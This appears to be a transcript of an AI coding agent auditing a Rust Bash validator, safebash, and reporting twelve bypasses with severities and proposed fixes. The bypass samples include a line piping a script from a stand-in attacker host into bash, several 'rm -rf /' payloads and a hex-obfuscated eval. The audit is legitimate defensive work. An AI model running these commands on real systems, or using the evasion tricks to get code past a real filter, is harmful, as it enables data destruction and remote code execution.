@@ -1,0 +1,305 @@
+● Read mod.rs
+  │ exp/011-validator-framework/src/rules/mod.rs
+  └ 24 lines read
+
+● Read single_bracket_test.rs
+  │ exp/011-validator-framework/src/rules/single_bracket_test.rs
+  └ 55 lines read
+
+● Read backtick_substitution.rs
+  │ exp/011-validator-framework/src/rules/backtick_substitution.rs
+  └ 28 lines read
+
+● Read indirect_expansion.rs
+  │ exp/011-validator-framework/src/rules/indirect_expansion.rs
+  └ 28 lines read
+
+● Read unquoted_expansion.rs
+  │ exp/011-validator-framework/src/rules/unquoted_expansion.rs
+  └ 92 lines read
+
+● Read dynamic_execution.rs
+  │ exp/011-validator-framework/src/rules/dynamic_execution.rs
+  └ 51 lines read
+
+● Read SUBSET.md
+  │ exp/SUBSET.md
+  └ 340 lines read
+
+● Read integration.rs
+  │ exp/011-validator-framework/tests/integration.rs
+  └ 335 lines read
+
+Now I have a complete picture of the validator. Let me analyze it for bypasses.
+
+---
+
+# Red Team Security Audit: safebash Validator Bypasses
+
+## Executive Summary
+
+After analyzing the validator implementation, I've identified several **CRITICAL** and **HIGH** severity bypasses where dangerous Bash constructs pass validation without any diagnostics.
+
+---
+
+## Finding 1: `builtin eval` Bypasses SB4001
+
+**Severity: CRITICAL**
+
+```bash
+#!/bin/bash
+# PASSES VALIDATION - no diagnostics
+cmd='rm -rf /'
+builtin eval "$cmd"
+```
+
+**What it achieves:** Arbitrary code execution via `eval`
+
+**Why validator misses it:** The `DynamicExecution` rule (line 36-38) only checks if the command word is literally `"eval"`. When prefixed with `builtin`, the command name becomes `"builtin"`, not `"eval"`. The validator doesn't examine arguments to `builtin`.
+
+**Fix required:** Check if command is `builtin` and second argument is `eval`.
+
+---
+
+## Finding 2: `command eval` Bypasses SB4001
+
+**Severity: CRITICAL**
+
+```bash
+#!/bin/bash
+# PASSES VALIDATION - no diagnostics
+cmd='curl http://evil.com/shell.sh | bash'
+command eval "$cmd"
+```
+
+**What it achieves:** Arbitrary code execution via `eval`
+
+**Why validator misses it:** Same as above — `command` prefix hides `eval` from detection.
+
+**Fix required:** Check if command is `command` and argument is `eval`.
+
+---
+
+## Finding 3: Alias Definition Bypasses All Rules
+
+**Severity: CRITICAL**
+
+```bash
+#!/bin/bash
+# PASSES VALIDATION - no diagnostics
+shopt -s expand_aliases
+alias e='eval'
+e 'rm -rf /'
+```
+
+**What it achieves:** Arbitrary code execution via aliased `eval`
+
+**Why validator misses it:** The validator only performs CST pattern matching. It doesn't track alias definitions. The command `e` is a literal word, not `eval`.
+
+**Fix required:** Either reject `alias` command entirely (marker rule) or reject aliases that expand to rejected commands. Given that aliases are resolved at parse time, this is analyzable.
+
+---
+
+## Finding 4: `env eval` Bypasses SB4001
+
+**Severity: CRITICAL**
+
+```bash
+#!/bin/bash
+# PASSES VALIDATION - no diagnostics
+env eval 'echo pwned; rm -rf /'
+```
+
+**What it achieves:** Arbitrary code execution via `env` running `eval`
+
+**Why validator misses it:** The command is `env`, not `eval`. The validator doesn't check arguments to external commands like `env`.
+
+**Fix required:** Check if command is `env`, `xargs`, or similar executors and their arguments include `eval`, `bash -c`, etc.
+
+---
+
+## Finding 5: `bash -c` Achieves Arbitrary Code Execution
+
+**Severity: CRITICAL**
+
+```bash
+#!/bin/bash
+# PASSES VALIDATION - no diagnostics
+bash -c 'rm -rf /'
+bash -c "$untrusted_input"
+```
+
+**What it achieves:** Arbitrary code execution via subshell
+
+**Why validator misses it:** `bash` is a literal command word, not `eval`. The `-c` flag takes arbitrary code as a string argument. The validator doesn't check for this pattern.
+
+**Fix required:** New rule SB4005 to reject `bash -c`, `sh -c`, `zsh -c`, `dash -c` patterns. This is equivalent to `eval` in capability.
+
+---
+
+## Finding 6: Process Substitution Can Execute Arbitrary Commands
+
+**Severity: HIGH**
+
+```bash
+#!/bin/bash
+# PASSES VALIDATION - no diagnostics
+read line < <(curl http://evil.com/data)
+```
+
+**What it achieves:** The validator doesn't constrain what commands run inside `<(...)` or `>(...)`. While this is expected behavior, it means:
+
+1. Commands inside process substitution are not subject to any special scrutiny
+2. Combined with other constructs, this provides execution paths
+
+**Note:** This is arguably working as intended (the command inside is validated), but worth documenting that the validator doesn't have special rules for process substitution.
+
+---
+
+## Finding 7: `declare -f` + `source /dev/stdin` Pattern
+
+**Severity: CRITICAL**
+
+```bash
+#!/bin/bash
+# PASSES VALIDATION - only gets SB4002 marker for source
+func_definition='myfunc() { rm -rf /; }'
+echo "$func_definition" > /tmp/funcs
+source /tmp/funcs  # Only marked, not rejected!
+myfunc
+```
+
+**What it achieves:** Define and execute arbitrary functions by writing to a file then sourcing it.
+
+**Why validator misses it:** `source` is marked (SB4002) but not rejected. The spec says source will be compiled to a safe KVP loader — but the validator doesn't enforce that the sourced file contains only KVP. If the compiler doesn't actually implement the safe KVP loader and just runs `source`, this is a bypass.
+
+**Note:** This depends on the compiler's behavior, not just the validator. The marker is intentional — but there's a gap if compilation doesn't happen.
+
+---
+
+## Finding 8: `xargs` Can Execute Arbitrary Commands
+
+**Severity: HIGH**
+
+```bash
+#!/bin/bash
+# PASSES VALIDATION - no diagnostics
+echo 'rm -rf /' | xargs -I{} sh -c '{}'
+```
+
+**What it achieves:** Arbitrary code execution via `xargs` + `sh -c`
+
+**Why validator misses it:** The validator doesn't analyze arguments to commands like `xargs`. The dangerous pattern `xargs ... sh -c` is not detected.
+
+---
+
+## Finding 9: `$'...'` ANSI-C Quoting Can Encode Eval
+
+**Severity: CRITICAL**
+
+```bash
+#!/bin/bash
+# PASSES VALIDATION - no diagnostics
+$'\x65\x76\x61\x6c' 'rm -rf /'
+# The above decodes to: eval 'rm -rf /'
+```
+
+**What it achieves:** Arbitrary code execution via obfuscated `eval`
+
+**Why validator misses it:** The validator checks for the literal word `eval`. ANSI-C quoting `$'...'` produces the same string but through hex/octal encoding. tree-sitter-bash parses this as an `ansi_c_string` node, not a `word` node with text `eval`.
+
+**Fix required:** The check for `eval` needs to also examine `ansi_c_string` nodes and decode their content.
+
+---
+
+## Finding 10: `.` (Dot) With Variable Argument
+
+**Severity: HIGH**
+
+```bash
+#!/bin/bash
+# PASSES VALIDATION - only SB4002 marker
+file_to_source="$1"
+. "$file_to_source"
+```
+
+**What it achieves:** Source arbitrary file controlled by runtime input
+
+**Why validator misses it:** `source`/`.` are marked, not rejected. If the argument is a variable containing attacker-controlled path, this sources arbitrary code. The safe KVP loader described in the spec would mitigate this — but only if implemented.
+
+---
+
+## Finding 11: `exec` Can Replace Process
+
+**Severity: HIGH**
+
+```bash
+#!/bin/bash
+# PASSES VALIDATION - no diagnostics
+exec /bin/sh -c "$untrusted"
+```
+
+**What it achieves:** Replace current process with arbitrary command
+
+**Why validator misses it:** `exec` is not in the reject list. It's a powerful primitive that can run arbitrary commands.
+
+**Fix required:** New rule for `exec` — at minimum mark it, potentially reject `exec cmd` patterns similar to `bash -c`.
+
+---
+
+## Finding 12: Nameref to External Variable Name
+
+**Severity: MEDIUM** (but worth noting)
+
+```bash
+#!/bin/bash
+# PASSES VALIDATION - no diagnostics
+varname="$1"  # Attacker controls this
+declare -n ref="$varname"
+ref="malicious value"  # Writes to arbitrary variable
+```
+
+**What it achieves:** Write to arbitrary variable chosen at runtime
+
+**Why validator allows it:** The spec explicitly allows namerefs. However, when the nameref target comes from untrusted input, this can overwrite critical variables (PATH, LD_PRELOAD in subcommands, etc.).
+
+**Note:** This is by design per the spec, but the threat model assumption that "script source is trusted" may not cover the case where script parameters come from untrusted sources.
+
+---
+
+## Summary Table
+
+| # | Bypass | Severity | Achieves | Root Cause |
+|---|--------|----------|----------|------------|
+| 1 | `builtin eval` | CRITICAL | Arbitrary code execution | Command prefixes not checked |
+| 2 | `command eval` | CRITICAL | Arbitrary code execution | Command prefixes not checked |
+| 3 | `alias e=eval; e` | CRITICAL | Arbitrary code execution | No alias tracking |
+| 4 | `env eval` | CRITICAL | Arbitrary code execution | External command args not checked |
+| 5 | `bash -c` | CRITICAL | Arbitrary code execution | Shell -c flag not rejected |
+| 6 | Process substitution | HIGH | Commands execute | Working as designed |
+| 7 | `source` file write | CRITICAL | Arbitrary code via source | Depends on compiler behavior |
+| 8 | `xargs sh -c` | HIGH | Arbitrary code execution | xargs patterns not checked |
+| 9 | `$'\x65val'` (ANSI-C) | CRITICAL | Obfuscated eval | Only literal "eval" checked |
+| 10 | `. "$var"` | HIGH | Source attacker path | source/. only marked |
+| 11 | `exec /bin/sh -c` | HIGH | Arbitrary execution | exec not in reject list |
+| 12 | Nameref + untrusted varname | MEDIUM | Write to arbitrary var | By design, but risky |
+
+---
+
+## Recommended Priority
+
+**Immediate (block compilation):**
+1. Reject `builtin eval`, `command eval` — extend SB4001
+2. Reject `bash -c`, `sh -c`, etc. — new rule SB4005
+3. Reject `$'...'` that decodes to `eval` — extend SB4001 detection
+4. Reject or mark `alias` — new rule SB4006
+
+**High Priority:**
+5. Reject `exec` with `-c` patterns or mark for review
+6. Reject `xargs ... sh -c` patterns
+7. Reject `env eval` / `env bash -c` patterns
+
+
+Changes   +0 -0
+Requests  3 Premium (59s)
+Tokens    ↑ 64.3k • ↓ 3.2k • 0 (cached)
